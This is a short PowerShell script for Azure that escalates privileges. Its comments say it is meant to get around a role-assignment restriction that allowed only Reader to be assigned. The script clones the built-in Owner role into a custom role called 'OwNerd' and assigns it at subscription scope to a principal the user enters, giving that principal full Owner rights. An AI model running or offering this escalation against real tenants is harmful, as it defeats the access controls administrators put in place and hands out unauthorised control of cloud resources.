Connect-AzAccount # at this point you should sign in the user with a restricted UAA role

$assigntarget = Read-Host -Prompt "Enter the target PricipalName(mostly email) to assign role"
$targetObjId =  Get-azaduser -UserPrincipalName "$assigntarget" | Select-Object -ExpandProperty Id
# $rg = Read-Host -Prompt "Enter resource group name" # do this if you wanna assign it at resource group level, thanos.ps1 will be useless then. well wtf all of these are useless, so it aint matter lol
$subId = (Get-AzSubscription | Select-Object -First 1).Id
$role = Get-AzRoleDefinition -Name "Owner" -Scope "/subscriptions/$subId"

# edit stuff here
$role.Name = "OwNerd"
$role.Description = "They said I can't assign anything but Reader, what a joke, here's a plain copy of the Owner"
$role.IsCustom = $true
$role.AssignableScopes.Clear()
$role.AssignableScopes.Add("/subscriptions/$subId")


New-AzRoleDefinition -Role $role

New-AzRoleAssignment -ObjectId $targetObjId -RoleDefinitionName $role.Name -Scope "/subscriptions/$subId"
